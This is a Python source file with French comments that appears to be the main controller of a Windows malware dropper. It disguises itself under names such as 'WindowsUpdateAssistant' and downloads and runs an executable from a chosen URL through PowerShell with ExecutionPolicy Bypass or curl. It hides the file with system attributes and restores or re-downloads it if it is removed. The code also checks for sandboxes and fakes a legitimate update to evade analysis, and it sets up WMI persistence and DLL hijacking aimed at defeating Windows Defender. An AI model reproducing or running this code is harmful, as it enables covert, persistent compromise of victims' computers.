import os
import tempfile
import random
import string
import platform
import time
import sys
import subprocess
import shutil
import threading
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from admin import is_admin, run_as_admin
from persist import PersistenceManager
from crypto import Encryptor
from wmi import WMIPersistence
from dll import DLLHijacker
from stealth import StealthManager

class Settings:
    """Configuration globale du programme."""

    def __init__(self):
        # Noms légitimes pour éviter la détection heuristique
        legitimate_names = [
            "WindowsUpdateAssistant",
            "MicrosoftEdgeUpdate",
            "OfficeClickToRun",
            "WindowsSecurityHealth",
            "SystemComponentMonitor"
        ]
        # Sélection aléatoire d'un nom légitime
        selected_name = random.choice(legitimate_names)
        random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        
        # Noms des composants
        self.temp_dir_name = f"{selected_name}_{random_id}"
        self.service_name = f"{selected_name}Service"
        
        # Emplacements pour la persistance
        self.temp_dir = os.path.join(tempfile.gettempdir(), self.temp_dir_name)
        self.appdata_dir = os.path.join(os.environ.get('APPDATA', ''), self.temp_dir_name)
        self.backup_dirs = [self.appdata_dir]
        
        # Variables de contrôle
        self.download_url = ""
        self.download_filename = "update_service.exe"
        
        # Noms des fichiers de script
        self.vbs_filename = "service_updater.vbs"
        self.bat_filename = "system_update.bat"
        self.ps_filename = "security_config.ps1"
        self.js_filename = "system_helper.js"
        
        # Flags pour les modules
        self.use_wmi_persistence = True
        self.use_dll_hijacking = True

class FileManager:
    """Gère les opérations sur les fichiers."""
    
    def __init__(self, settings, encryptor):
        self.settings = settings
        self.encryptor = encryptor
        
    def download_and_execute(self):
        """Télécharge et exécute un fichier avec méthodes alternatives en cas d'échec."""
        if not self.settings.download_url:
            print("[-] URL de téléchargement non spécifiée")
            return False
        
        try:
            print(f"[+] Téléchargement depuis: {self.settings.download_url}")
            target_path = os.path.join(self.settings.temp_dir, self.settings.download_filename)
            
            # PowerShell pour le téléchargement sécurisé
            ps_download = f"""
            try {{
                [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
                $wc = New-Object System.Net.WebClient
                $wc.DownloadFile('{self.settings.download_url}', '{target_path}')
                "Success"
            }} catch {{
                "Failed: $_"
            }}
            """
            
            result = subprocess.run([
                'powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps_download
            ], capture_output=True, text=True)
            
            # Alternative: curl si PowerShell échoue
            if not os.path.exists(target_path) or os.path.getsize(target_path) == 0:
                try:
                    subprocess.run([
                        'curl', '-L', '-o', target_path, self.settings.download_url
                    ], check=False, capture_output=True)
                except Exception:
                    pass
            
            # Vérifier le résultat
            if os.path.exists(target_path) and os.path.getsize(target_path) > 0:
                print(f"[+] Fichier téléchargé avec succès: {target_path}")
                
                # Masquer le fichier
                subprocess.run(['attrib', '+h', '+s', target_path], check=False)
                
                # Créer une copie de sauvegarde
                backup_path = os.path.join(self.settings.appdata_dir, self.settings.download_filename)
                try:
                    shutil.copy2(target_path, backup_path)
                    subprocess.run(['attrib', '+h', '+s', backup_path], check=False)
                except Exception as e:
                    print(f"[-] Erreur lors de la création de la sauvegarde: {e}")
                
                # Exécuter le fichier
                subprocess.Popen([target_path], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                return True
            else:
                print(f"[-] Échec du téléchargement")
                return False
                
        except Exception as e:
            print(f"[-] Erreur lors du téléchargement ou de l'exécution: {e}")
            return False
    
    def check_and_restore_executables(self):
        """Vérifie et restaure les fichiers exécutables."""
        main_path = os.path.join(self.settings.temp_dir, self.settings.download_filename)
        backup_path = os.path.join(self.settings.appdata_dir, self.settings.download_filename)
        
        if not os.path.exists(main_path) and os.path.exists(backup_path):
            print("[!] Fichier principal supprimé - Restauration depuis la sauvegarde...")
            try:
                shutil.copy2(backup_path, main_path)
                subprocess.run(['attrib', '+h', '+s', main_path], check=False)
            except Exception:
                pass
        
        elif not os.path.exists(main_path) and not os.path.exists(backup_path) and self.settings.download_url:
            print("[!] Tous les fichiers exécutables supprimés - Retéléchargement...")
            self.download_and_execute()


def main():
    """Fonction principale du programme."""
    if not run_as_admin():
        print("[!] Ces fonctionnalités nécessitent des privilèges administrateur")
        sys.exit(1)

    print("\n=== SYSTÈME DE PERSISTANCE AVANCÉ CONTRE WINDOWS DEFENDER ===")
    print(f"Système: {platform.system()} {platform.version()}")
    print(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)

    try:
        # Initialisation
        settings = Settings()
        
        # Initialiser le gestionnaire de furtivité
        stealth_manager = StealthManager(settings)
        
        # Vérifier l'environnement d'exécution avant tout
        risk_level, sandbox_signs = stealth_manager.check_environment()
        print(f"[+] Niveau de risque détecté: {risk_level} (Indicateurs: {sandbox_signs})")
        
        # Si environnement à haut risque, appliquer des techniques d'évasion
        if risk_level == "high":
            print("[!] Environnement potentiellement hostile détecté - Activation des contre-mesures")
            stealth_manager.apply_sleeper_strategy(risk_level)
            # Si on est dans un sandbox, simuler un comportement légitime puis terminer
            if sandbox_signs >= 5:
                stealth_manager.simulate_legitimate_update()
                print("[+] Opération terminée normalement.")
                return True
        
        # Simuler un processus Windows légitime pour détourner l'attention
        stealth_manager.spawn_legitimate_process()
        
        # Créer un profil de compatibilité Windows légitime
        stealth_manager.create_windows_compatibility_profile()
        
        # Créer des fichiers légitimes pour camoufler l'activité
        stealth_manager.create_legitimate_file_history()
        
        # Suite du code original...
        encryptor = Encryptor(settings)
        file_manager = FileManager(settings, encryptor)
        persistence_manager = PersistenceManager(settings, encryptor)
        
        # Initialiser les nouveaux modules
        wmi_persistence = WMIPersistence(settings)
        dll_hijacker = DLLHijacker(settings)
        
        # Interface utilisateur initiale
        settings.download_url = input("Entrez l'URL de téléchargement du fichier: ")
        if not settings.download_url.strip():
            print("[-] Aucune URL fournie. Continuer sans téléchargement.")
        else:
            custom_filename = input("Nom du fichier à télécharger (défaut: update_service.exe): ")
            if custom_filename.strip():
                settings.download_filename = custom_filename.strip()
        
        # Demander l'utilisation des modules supplémentaires
        use_wmi = input("Utiliser la persistance WMI? (o/n, défaut: o): ").lower()
        settings.use_wmi_persistence = use_wmi != 'n'
        
        use_dll = input("Utiliser le DLL Hijacking? (o/n, défaut: o): ").lower()
        settings.use_dll_hijacking = use_dll != 'n'

        # Configuration complète
        persistence_manager.setup_infrastructure()
        
        # Configurer la persistance WMI si demandée
        if settings.use_wmi_persistence:
            wmi_thread = threading.Thread(target=wmi_persistence.setup_wmi_persistence)
            wmi_thread.daemon = True
            wmi_thread.start()
        
        # Configurer le DLL Hijacking si demandé
        if settings.use_dll_hijacking:
            dll_thread = threading.Thread(target=dll_hijacker.implement_dll_hijacking)
            dll_thread.daemon = True
            dll_thread.start()
        
        # Téléchargement si URL fournie
        if settings.download_url:
            file_manager.download_and_execute()

        # Surveillance en thread séparé
        persistence_manager.start_monitoring(file_manager)
        
        # Fonction de surveillance des modules supplémentaires
        def check_additional_persistence():
            while not persistence_manager.stop_monitoring:
                try:
                    if settings.use_wmi_persistence:
                        wmi_persistence.check_wmi_persistence()
                    # Vérifier régulièrement si l'environnement est devenu hostile
                    new_risk, _ = stealth_manager.check_environment()
                    if new_risk == "high":
                        stealth_manager.apply_sleeper_strategy("medium")  # Réponse adaptée
                    time.sleep(300)  # Vérifier toutes les 5 minutes
                except Exception as e:
                    print(f"[-] Erreur lors de la vérification des modules supplémentaires: {e}")
        
        # Démarrer la surveillance des modules supplémentaires
        additional_monitor = threading.Thread(target=check_additional_persistence)
        additional_monitor.daemon = True
        additional_monitor.start()

        # Informations de diagnostic
        persistence_manager.print_diagnostic_info()
        
        # Afficher les informations sur les modules supplémentaires
        print("\n=== MODULES DE PERSISTANCE SUPPLÉMENTAIRES ===")
        if settings.use_wmi_persistence:
            print("[+] Persistance WMI: Active")
        else:
            print("[-] Persistance WMI: Inactive")
            
        if settings.use_dll_hijacking:
            print("[+] DLL Hijacking: Actif")
        else:
            print("[-] DLL Hijacking: Inactif")
            
        # Afficher les informations sur le module de furtivité
        print("[+] Module de furtivité: Actif")
        print("=" * 60)

        print("[+] Surveillance active. Appuyez sur Ctrl+C pour arrêter...")

        while True:
            # Ajouter une activité aléatoire périodique pour paraître comme un processus légitime
            if random.random() < 0.05:  # 5% de chance à chaque itération
                stealth_manager._minimal_activity()
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n[!] Interruption par l'utilisateur")
        persistence_manager.stop_monitoring = True
        return True
    except Exception as e:
        print(f"[-] Erreur générale: {e}")
        return False


if __name__ == "__main__":
    main()